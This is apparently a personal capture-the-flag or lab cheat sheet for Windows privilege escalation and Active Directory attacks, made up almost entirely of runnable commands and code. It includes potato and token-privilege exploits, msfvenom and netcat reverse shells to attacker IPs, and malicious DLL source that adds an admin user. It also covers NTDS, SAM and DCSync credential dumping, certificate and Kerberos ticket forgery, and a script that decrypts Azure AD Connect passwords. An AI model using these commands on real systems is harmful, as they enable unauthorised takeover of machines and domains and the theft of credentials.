```whoami /priv```
- check any Se privs here https://github.com/gtworek/Priv2Admin
***SeImpersonatePrivilege***
JuicyPotatoNG.exe
```
.\JuicyPotatoNG.exe -t * -p shell.exe
```
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.90.250 LPORT=8082 -f exe > shell.exe`
- `rlwrap -cAr nc -lnvp 8082`
- 
GodPotato
	- Create RDP admin user:
```
.\GodPotato-NET4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
```

```
.\GodPotato-NET4.exe -cmd "cmd /c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes"
```

```
.\GodPotato-NET4.exe -cmd "cmd /c net user chepe P@ssw0rd /add"
```

```
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators chepe /add"
```
other versions: [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
- https://github.com/itm4n/PrintSpoofer/releases

***SeMachineAccountPrivilege***
	- See [[#^062636|RBCD Attack]] below
	- See [[#^8bdeef|DC Sync Attack]] below
	- See [[#^b9f60c|Azure Connect abuse]] below

***SeBackupPrivilege***
	- upload files from [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) to `C:\programdata` directory
		- `import-module .\SeBackupPrivilegeCmdLets.dll`
		- `import-module .\SeBackupPrivilegeUtils.dll`
	- Can now copy and read files you wouldn't normally be able to as a non-admin user. Example:
```
Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt 0xdf.txt
```
- `type \programdata\0xdf.txt`
- can also use to read `ntds.dit` which holds all the password hashes
	- `Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .`
		- if can't copy because it's in use, try DiskShadow
			- create file on kali *vss.dsh*:
```
set context persistent nowriters  
add volume c: alias df  
create  
expose %df% z:
```
- `sudo unix2dos vss.dsh` on kali
- `upload vss.dsh` on remote machine (copy to machine via evil-winrm)
on remote machine, run diskshadow (built-in windows utility)
```
diskshadow /s c:\programdata\vss.dsh
```
`smbserver.py s . -smb2support` on kali, start smb server
`net use \\10.10.14.172 \s` on remote machine, mount smb server
`Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.172\s\ntds.dit` on remote machine, copy ntds.dit to kali via smb server
`reg.exe save HKLM\SYSTEM C:\system.hiv` on remote machine, copy SYSTEM reg key to C: drive
`Copy-Item C:\system.hiv \\10.10.14.172\s\system` on remote machine, copy from C drive to kali
`secretsdump.py -system system -ntds ntds.dit LOCAL` on kali, to dump hashes from ntds and system file

***SeBackUpPrivilege alternate path*** (if ntds or system and sam wont copy):
- `cd c:\`
- `mkdir Temp`
- `cd \Temp`
- `reg save hklm\sam c:\Temp\sam`
- `reg save hklm\system c:\Temp\system`
- `download sam`
- `download system`
create script.txt on kali:
```
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
- `upload script.txt` to C:\Temp
```
diskshadow /s script.txt
```

```
robocopy /b E:\Windows\ntds . ntds.dit
```
- `download ntds.dit`
```
secretsdump.py -sam sam -system system -ntds ntds.dit LOCAL
```
- get admin hash (2nd part after :)
```
evil-winrm -i 10.129.139.85 -u administrator -H "2b87e7c93a3e8a0ea4a581937016f341"
```
- PTH

***SeManageVolumePrivilege***
- SeManageVolumeExploit.exe from [https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9)
	- upload to target and run
	- allows for dll hijacking by writing to C drive
		- also allows for icacls on privileged folders like windows\system32
	- `systeminfo` command uses tzres.dll so create malicious payload
		- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=135 -f dll -o tzres.dll`
	- upload to machine, overwriting actual DLL
		- `iwr http://192.168.45.205/tzres.dll -o c:\Windows\System32\wbem\tzres.dll`
	- start listener 
		- `rlwrap -cAr nc -lnvp 135`
	- run `systeminfo` command
		- will output error, but will also get an admin shell at listener

***SeRestorePrivilege***
- need to alter a manual start service into a malicious one. `seclogon` is good target because doesn't require admin permissions 
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon
```
- need to see:
	- ObjectName = LocalSystem
	- RequiredPrivileges lists SeRestorePrivilege
	- Start value = 0x3 (0x3 means manual)
```
cmd.exe /c sc sdshow seclogon
```
- confirm we have correct permissions to manipulate the service
- need to see RP on the AU section, ex (A;;CCLCSW==RP==DTLOCRRC;;;==AU==)
	- RP = Start Service
	- AU = All Users
start listener, upload SeRestoreAbuse.exe and nc.exe to C:\temp, and run this command:
```
.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.208 4444 -e powershell.exe"
```
- root shell; might be unstable, use nc to create another shell (will be more stable without SeRestoreAb)

***Powershell history***
```
type C:\users\rudi.davis\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
- also check actual folder for other files
- check other users (sometimes administrator isn't blocked?)


***Search reg keys***
```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query HKCU /f password /t REG_SZ /s
```

***Check listening ports***
```
netstat -ano | findstr LISTENING
```
TCP
```
Get-NetTCPConnection -State Listen | ForEach-Object { $_ | Add-Member -MemberType NoteProperty -Name ProcessName -Value (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name; $_ } | Select-Object LocalAddress, LocalPort, OwningProcess, ProcessName
```
- more details
UDP
```
Get-NetUDPEndpoint | ForEach-Object { $_ | Add-Member -MemberType NoteProperty -Name ProcessName -Value (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name; $_ } | Select-Object LocalAddress, LocalPort, OwningProcess, ProcessName
```


***Check  `C:\Program Files` and `C\Program Files (x86)` for third-party programs***
- if anything interesting, check permissions on executables and directories
	- `icalcs "C:\Program Files\nasm-2.24\win64\nssm.exe"`
	- `icalcs "C:\Program Files\nasm-2.24\win64"`
		- looking at BUILTIN\Users: for (W), (M) or (F)
			- could potentially hijack a service or disguise a rev shell

***version/architecture***
```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"
```
- if no hotfixes, look into kernel exploits, try MS10-059 `Chimichurri.exe`
	-  [https://github.com/egre55/windows-kernel-exploits/tree/master](https://github.com/egre55/windows-kernel-exploits/tree/master)


32bit or 64 bit
```
[Environment]::Is64BitProcess
```
- powershell

***search for stored credentials***
```
cmdkey /list
```

***check autologon creds in registry:***
```
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon
```

***current user group memberships:***
```
net user <current-user>
```

***check who's in local administrator group:***
```
net localgroup administrators
```

***search for hidden/interesting files in root of filesystem:***
```
cmd.exe /c dir /a C:\
```
- don't overlook $Recycle.Bin
	- `Get-ChildItem -Path 'C:\$Recycle.Bin' -Force`

add read permissions to a file:
```
icacls "C:\backup\restore.txt" /grant "Everyone:(R)"
```

***unquoted service paths***
```
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -match ' ' }
```
^powershell
```
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
^cmd

***Insecure Service Permissions***
```
$services = Get-WmiObject -Class win32_service | Select-Object Name, StartName, PathName  
    foreach ($service in $services) {  
      $acl = Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\$($service.Name)"  
      $acl.Access 
    }
```

```
accesschk.exe /accepteula -wuvc "C:\Program Files"
```

```
accesschk.exe /accepteula -uwcqv *
```
- Look for entries where the user has WRITE_DAC, WRITE_OWNER, or SERVICE_CHANGE_CONFIG permissions.
- confirm service is vulnerable with:
	- `sc qc VulnerableService`
		- example output:
			- [SC] QueryServiceConfig SUCCESS
				SERVICE_NAME: VulnerableService
			       TYPE               : 10  WIN32_OWN_PROCESS
			       START_TYPE         : 2   AUTO_START
			       ERROR_CONTROL      : 1   NORMAL
			       BINARY_PATH_NAME   : C:\Program Files\VulnerableService\service.exe
			       LOAD_ORDER_GROUP   :
			       TAG                : 0
			       DISPLAY_NAME       : Vulnerable Service
			       DEPENDENCIES       :
			       SERVICE_START_NAME : LocalSystem
- replace binary file with msfvenom revshell .exe
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=1234 -f exe -o service.exe`
- restart the service
	- `net stop VulnerableService`
	- `net start VulnerableService`

***Weak Registry Permissions***
- Check permissions on registry keys:
	- `icacls C:\path\to\file`
```
accesschk.exe /accepteula -kqv "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
```

```
reg query "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService"
```
- if key is writable by standard using, point ImagePath of VulnerableService to msfvenom shell located in directory user can write to:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\malicious.exe" /f
```
- restart the service:
	- `net stop VulnerableService`
	- `net start VulnerableService`

Credentials in Files
```
Select-String -Path "C:\*" -Pattern "password"
```
^powershell
```
findstr /si password *.txt *.ini *.config
```
^cmd

Scheduled Tasks
```
schtasks /query /fo LIST /v
```

```
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"}
```
- look for write permissions on a task run as SYSTEM
- modify to point at revshell
	- `schtasks /change /tn "TrustedTask" /tr "C:\Users\Public\malicious.exe"`
- trigger the task
	- `schtasks /run /tn "TrustedTask"`

DLL Hijacking
- Check writable directories in PATH:
	- `$env:PATH.Split(';') | ForEach-Object { Get-Acl $_ }`
- use procmon on another windows environment to find the name of the DLL the target application tries to load from the writable directory
	- transfer target .exe to host windows machine with smbserver.py or wormhole.app
	- launch procmon.exe from downloads\ProcessMonitor\procmon.exe
	- run target .exe
	- ctrl+E in procmon to stop monitoring
	- ctrl+L to bring up filter. Add 3 filters and hit Apply:
		- ProcessName + contains + *name of executable without .exe* > Add
		- Path + ends with + .dll > Add
		- Result + is + NAME NOT FOUND > Add
	- look for dll that sounds important. good indicator is it appears multiple times in filtered list
- on kali run `file KasperskyRemovalTool.exe` to see if 32 bit or 64 bit
	- if 32 bit, run `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.2.206 LPORT=2222 -f dll > KasperskyRemovalToolENU.dll`
	- if 64 bit, run `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.2.206 LPORT=2222 -f dll > KasperskyRemovalToolENU.dll`
- start listener and transfer dll to same directory of .exe file on target machine with smb server
Another method is to create malicious dll that creates a new user
- `sudo vi myDLL.cpp`
myDLL.cpp:
```
#include<stdlib.h>#include<windows.h>BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){  
        switch(ul_reason_for_call) {  
            caseDLL_PROCESS_ATTACH:  
                inti;  
                i = system("net user rogue password123! /add");  
                i = system("net localgroup administrators rogue /add");  
                break;  
            caseDLL_THREAD_ATTACH:  
            caseDLL_THREAD_DETACH:  
            caseDLL_PROCESS_DETACH:  
                break;  
        }  
        returnTRUE;  
    }
```

```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
- compile the dll
- copy myDLL.dll to same directory as scheduler.exe (C:\Scheduler\) and rename beyondhelper.dll
- go to services and restart scheduler
- confirm new user rogue was created with command:
	- `net user rogue`
- might need to restart service:
	- `net stop VulnerableService`
	- `net start VulnerableService`

Insecure File Permissions
```
accesschk.exe /accepteula -wvu "C:\Program Files"
```

Environmental Variables
```
Get-ChildItem Env:
```

```
$env:PATH.Split(';') | ForEach-Object { Get-Acl $_ }
```

Network Configuration
- `ipconfig /all`

Enumerate Users and Groups
- `net user`
- `net user Ryan.Cooper /domain`
- `net localgroup`
- `net groups "Domain Admins" /domain`

Enumerate nested groups by uploading PowerView.ps1
`. .\PowerView.ps1`
`Get-DomainGroup -MemberIdentity 'rudi.davis' | select samaccountname`
- might see groups not listed with `net groups`
`Get-DomainGroup 'Domain Admins' | select samaccountname,memberof`
- check the CN= part for nested groups

Enumerate Installed Software
```
Get-WmiObject -Class Win32_Product
```
- List installed software:

Runas when finding creds as a test (in powershell)
```
powershell
```
```
hostname
```
- use before \ in next command
```
$user = "Sniper\Chris"
```
```
$pass = "36mEAhz/B8xQ~2VM"
```
```
$secstr = New-Object -TypeName System.Security.SecureString
```
```
$pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
```
```
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
```
```
Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
```
- should return name of new user creds if creds are valid and if user is in remote users group
```
Invoke-Command -ScriptBlock { type \users\chris\desktop\user.txt } -Credential $cred -Computer localhost
```
- get flag
```
Invoke-Command -ScriptBlock { \\10.10.14.142\share\nc64.exe -e cmd 10.10.14.142 80 } -Credential $cred -Computer localhost
```
- turn into shell, catch with `rlwrap nc -lvnp 443`

Weaponize .chm files with nishang
- download Out-CHM.ps1 from https://github.com/samratashok/nishang/releases/tag/v0.7.6 under \client\ directory
```
. .\Out-CHM.ps1
```
- run on personal windows machine
```
Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.142 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```
- also run on personal windows machine, creates doc.chm
```
copy \\10.10.14.142\share\doc.chm .
```
- transfer doc.shm to target machine (in this example with smbserver)
```
copy \\10.10.14.142\share\nc64.exe \windows\system32\spool\drivers\color\
```
- also transfer nc64.exe to that directory
- after a minute or so, will catch shell from `rlwrap nc -lvnp 443`

#### winpeas
`.\winPEASx64.exe`
#### AlwaysInstallElevated
*Allows current user to install msi's as Administrator*
- will see on winpeas:
	- AlwaysInstallElevated set to 1 in HKLM and HKCU set to 1
	- Also get the AutoLogon credentials for current user
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.210.90.250 LPORT=6969 -f msi > privesc.msi
```
- create msi rev shell
```
python -m http.server 80
```
- host with python server
```
wget http://10.21.90.250/privesc.msi -o privesc.msi
```
- transfer to machine
```
rlwrap -cAr nc -lvnp 6969
```
- setup listener
```
runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\malicious.msi"
```
- run msi shell as admin, catch shell with listener


AD CS
- upload Certify.exe
```
./certify.exe find /vulnerable
```
- Template Name: UserAuthentication
- msPKI-Certificate-Name-Flag: ENROLLE SUPPLIES SUBJECT
- Permissions: Enrollment Rights includes Domain Users
	- must be logged in as domain user
```
./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```
- should return RSA Private Key and Certificate
	- copy/paste into file on kali named "cert.pem"
- on kali run:
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- password is blank
- then run:
```
certipy auth -pfx cert.pfx -dc-ip 10.129.121.20 -username Administrator -domain sequel.htb
```
- should return administrator ntlm hash
	- if not, run:
		- `ntpdate 10.129.121.20`
			- may need to run multiple times, until "no skew", but might work with just "no leap"; keep trying and running certipy command right after

Can also run ADCS remotely with certipy
```
certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
- bottom of output will list vulnerabilities like ESC7
	- exploit ESC7:
```
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- adds user Raven to group that can manage CA permissions
```
certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```
- same command as above, run to confirm user was added to group successfully (look at ManageCertificates row for user added)
```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- command is supposed to fail, but saves private key (hit `y`)
```
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- should successfully issue certificate
	- if it fails go back to previous command to add Raven to group (as this resets)
```
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```
- retrieves the issued certificate and saves as administrator.pfx
```
certipy auth -pfx administrator.pfx -dc-ip manager.htb
```
- should give hash for administrator for pass-the-hash (use part after the colon)
	- if nameserver error, try replacing `manager.htb` with ip of machine
- if clockskew error, run:
```
sudo ntpdate 10.129.42.194
```
- should sync time to machine, then run prior command
- make take multiple attempts

RBCD (Resource Based Constrained Delegation) Attack ^062636
- Requirements:
	- `SeMachineAccountPrivilege` shows enabled
		- `whoami /priv` to check current user
	- `Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota`
		- shows quota, must be more than 0, default is 10
		- `. .\PowerView.ps1` required for commands
	- must be 2012+ DC
		- `Get-DomainController | select name,osversion | fl`
	- `msds-allowedtoactonbehalfofotheridentity` must be empty
		- `Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl`
```
New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
```
- create fake computer
- requires `. .\Powermad.ps1`
```
$fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
```
- save SID as variable
	- check it saved with `$fakesid` command
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```
- creating ACL step 1: command creates raw security descriptor $SD with specific access control entries
```
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```
- creating ACL step 2: creates new byte array $SDBytes with length equal to binary length of security descriptor
```
$SD.GetBinaryForm($SDBytes, 0)
```
- creating ACL step 3: converts $SD into binary form and stores in the byte array
```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
- creating ACL step 4: applies security descriptor to the `msds-allowedtoactonbehalfofotheridentity` attribute of the target computer object
	- check it worked:
		- `$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
		- `$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`
		- `$Descriptor.DiscretionaryAcl`
			- will display `AccessAllowed` under AceType if worked
```
.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
```
- get hash of fake computer account labeled rc4_mac and put into next command:
```
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```
- last base64 ticket listed should be for administrator
	- copy and save it to kali without spaces as `ticket.kirbi.b64`
on kali:
```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```
- base64 decode and save as ticket.kirbi
```
ticketConverter.py ticket.kirbi ticket.ccache
```
- save ticket in cacheable format
```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```
- saves ticket in cash and get shell as administrator


***ReadGMSAPassword privilege in Bloodhound***
can confirm account is a service account with GMSA enabled
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```
- Will list service accounts and ObjectClass will say msDS-GroupmanageServiceAccount if GMSA is enabled
get more insight into the group that manages this service account, import PowerView.ps1, then run:
```
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
```
- will show service account/user `svc_apache` and the groups that have this permission under `PrincipalsAllowedToDelegateToAccount` with CN=
	- check who's a member of that group with 
```
Get-ADGroupMember 'Web Admins'
```
extract hash from user listed (need shell as another user and upload tool):
```
.\GMSAPasswordReader.exe --accountname svc_apache$
```
- current value rc4_mac is the NT hash
extract hash from user's listed in above command (need creds)
```
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```
forge ticket from delegated service, pass ticket from previous command:
```
getST.py -dc-ip 10.129.227.54 -spn www/dc.intelligence.htb -hashes :51e4932f13712047027300f869d07ab6 -impersonate administrator intelligence.htb/svc_int
```
shell via cached ticket (caches automatically from previous command):
```
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```
- make sure `dc.intelligence.htb` is added to `/etc/host` before running

DC Sync Attack  ^8bdeef
- requirements: user creds with DCSync privileges
```
secretsdump.py -just-dc egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround\!@10.129.102.130
```
- will return admin hash
	- take part of hash after `:` and pass-the-hash with `-H` via `nxc` or `evil-winrm`
Can create new user to perform DC Sync if needed:
- `. .\PowerView.ps1`
- `net user zeus password /add /domain`
- `net users /domain`
	- make sure zeus is listed
- `net group "Exchange Windows Permissions" /add zeus`
	- adding zeus to group with DCSync privileges
- `net user zeus`
	- make sure group is listed
- `$pass = convertto-securestring 'password' -AsPlainText -Force`
- `New-Object System.Management.Automation.PSCredential('htb\zeus', $pass)`
- `Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeus -Rights DCSync`
	- if fails, re-import PowerView.ps1
- run `secretsdump.py` command above from kali


Azure Connect abuse ^b9f60c
- requires creds to a user with Azure Admins group membership
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
- save as .ps1 (currently saved in ~/HTB/monteverde/poc.ps1) and upload to shell and run `.\poc.ps1` to get administrator password


LAPS
see *ReadLAPSPassword* in bloodhound but no foothold/shell, use nxc:
```
nxc ldap 192.168.199.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.199.122 -M laps
```

`net user svc_deploy` shows "LAPS_Readers" or something similar to imply LAPS is happening
```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```
- ms-mcs-admpwd property shows the local admin password for the box
- `evil-winrm -i 10.129.98.245 -S -u administrator -p 'l2H.h7Ao4m04tk7z+0v5LB.['`
	- root flag will actually be in a different static directory on the box instead of admin because the admin user wont have a static password to confirm flag


`whoami` shows nt authority\local service, use `.\FullPowers.exe` to grant yourself SeImpersonatePrivilege and then run printspoofer/potato exploit


PrintNightmare
- copy CVE-2021-1675.ps1 to target and type command `Invoke-Nightmare`
	- creates admin user on machine `adm1n:P@ssw0rd`


CVE-2019-1388 "Windows Certificate Dialog Elevation of Privilege"
- requries windows GUI (RDP)
1) find a program that can trigger the UAC prompt screen. run it
2) select "Show more details"
3) select "Show information about the publisher's certificate"
4) click on the "Issued by" URL link it will prompt a browser interface. Select Internet Explorer
5) wait for the site to be fully loaded (even if fails to load) & select "save as" to prompt a explorer window for "save as".
6) on the explorer window address path, enter the cmd.exe full path:
	- C:\WINDOWS\system32\cmd.exe
7) now you'll have an escalated privileges command prompt. 
- [https://github.com/nobodyatall648/CVE-2019-1388?tab=readme-ov-file](https://github.com/nobodyatall648/CVE-2019-1388?tab=readme-ov-file)
- [CVE-2019-1388: abuse UAC Windows Certificate Dialog (Windows Local Privilege Escalation)](https://www.youtube.com/watch?v=RW5l6dQ8H-8)

CVE-2017-0213
- Requires OS Version: 10.0.14393 (Build 14393)
	- `systeminfo` to check this
- exploit here https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213
- transfer and run


#### WSL
check `/mnt/c`
- if empty, run command:
```
mount -t drvfs C: /mnt/c
```
- remount drive
- if already in /mnt/c, make sure to cd / then go back in to refresh it
```
cd /mnt/c/Users/Administrator/Desktop
```
- might be able to access admin (or may need to combine with another privesc)

#### nt authority\system but flag says access denied
```
takeown /f "C:\Users\Administrator\Desktop\root.txt"
```
- takes ownership of file
```
dir /q "C:\Users\Administrator\Desktop\root.txt"
```
- should show nt authority\system as owner
```
icacls "C:\Users\Administrator\Desktop\root.txt" /grant SYSTEM:F
```
- grants system user (yourself) full access